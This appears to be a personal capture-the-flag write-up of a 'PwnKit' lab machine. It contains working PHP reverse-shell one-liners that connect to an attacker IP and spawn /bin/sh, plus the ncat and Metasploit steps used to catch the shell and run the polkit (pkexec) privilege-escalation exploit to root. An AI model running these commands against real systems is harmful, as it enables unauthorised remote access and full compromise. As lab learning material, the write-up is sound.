# 🐚 PwnKit

#reverse_shell #linux_priv_escalation #web_shell

This room was about using a web shell to exploit a Linux machine and eventually perform privilege escalation to access the root folder.

>[!info]- Post Room Summary
>This room was rated "very easy" and took ~4-4half hours :(
>
>**User Own**
>This part of the room was easy (only taking around 10-15mins to complete) and I only needed three commands:
>- pwd
>- ls
>- cat
>  
>  The user flag was found using the command: `cat ../../../home/pwnmeow/user.txt`
>  
>  **System Own**
>  This part of the room was solid and required learning a lot. The tools / techniques I ended up needing were:
>  - reverse shell
>  - metaploit
>  - privilege escalation
>  - polkit exploit

---
# User Own

List of commands used:

`pwd` - to see where I currently am

This outputted: `/var/www/html`

From here I just explored the file system using cd and ls

---

# System Own

The room offered the hint:

```
This webshell is provided for an easy foothold on this machine. Exploitation will be done after gaining a reverse shell as a user account with limited privileges.
```

So I knew I needed to create a reverse shell using the web shell of the target. I had previously created a reverse shell in the [[Shocker]] room.

I originally created a reverse shell in the attacker terminal and this did work, however I decided to recreate it using Metasploit so that I could run exploits for the purpose of privilege escalation.

## Terminal Reverse Shell

I created a listener on the attack machine using NetCat:

```bash
ncat -lvnp 4444
```

Then I entered the following command into the web shell:

```php
php -r '$sock=fsockopen("10.10.14.15",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

This created the reverse shell and allowed me to explore the system.

After exploring around the system, I could not enter the `root` file, edit the `sudoers` file or do anything that required privileges. 

Researching the box's name `PwnKit` came up with clues as to how we could finish this pox. `PwnKit` is associated with a known exploit: Polkit.

Polkit is a user management service on linux and searching 'Polkit' on metasploit displayed some interesting options.

## Metasploit Reverse Shell

> It was this part of the box where I learnt some new things about Metasploit such as sessions!!

#### Getting the Reverse Shell

1. Run Metasploit using: `msfconsole`
2. Configure `multi/handler` to listen for incoming connections: `msf> use exploit/multi/handler`
3. Set the payload - since we are using a direct shell command (entered in the web shell) a generic TCP listener will do: `msf> set payload generic/shell_reverse_tcp`
4. Configure payload options - should match details used in php reverse shell code:
	1. `set LHOST 10.10.14.3`
	2. `set LPORT 4444`
5. Start the listener: `msf> exploit` or `msf> run`
6. Execute the PHP Reverse Shell in the web shell:
   ```
   php -r '$sock=fsockopen("10.10.14.3",4444);exec("/bin/sh -i <&3 >&3 2>&3"); '
   ```
   
   The Web Shell:
   ![[pwnkit_webshell.png]]
   
   Metasploit listening and receiving the connection:
   ![[metasploit_listener.png]]

#### Using the Metasploit Exploit

> Note: I am doing this write up after completing the lab (which took around 4 hours), how I came to know about polkit and pkexec I cannot remember but I had about 20 tabs open from research so came across them somehow - this is how I knew what to search in Metasploit

1. Send the reverse shell session into the background to keep it running while we load the exploit: `background`
2. Escape out of : `back`
3. Search for exploits that use polkit: `search polkit`
   ![[polkit_search.png]]
4. I previously tried 3 but this yielded no results so I tried 2 instead (since this listed polkit and pkexec): `use 2`
5. Set the options:
	1. `set LHOST 10.10.14.15`
	2. `set session 1` - `sessions` can be used to find a list of currently active sessions
6. Run the exploit: `run`
   As you can see in this screenshot, the exploit ran successfully and created a second Meterpreter session for me:
   ![[polkit_exploit.png]]
   
#### Using Root Privileges

After successfully using the exploit we now have a root session on the target machine. Using `ctrl+C` after running the exploit puts me back in the main menu and by running the command `sessions` I can see there are now two. To enter the 2nd which has root access I can use the command: `sessions -i <sessionID>`

![[metasploit_active_sessions.png]]
\- viewing active sessions

![[root_access.png]]
\- accessing root session and retrieving `root.txt` flag.

---

# 🔗 Useful Links

- [Reverse Shell Cheat Sheet](https://medium.com/@cuncis/reverse-shell-cheat-sheet-creating-and-using-reverse-shells-for-penetration-testing-and-security-d25a6923362e)
- [What is Web Shell](https://www.invicti.com/learn/web-shell/)

## ⛔ Not-So-Useful Links

These are the other websites I visited but did not get anything useful to this situation from them:
- [Sudo Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version)
- [hackthebox - tale of pwnkit](https://www.hackthebox.com/blog/The-tale-of-CVE-2021-4034-AKA-PwnKit-The-13-Year-Old-Bug)
- 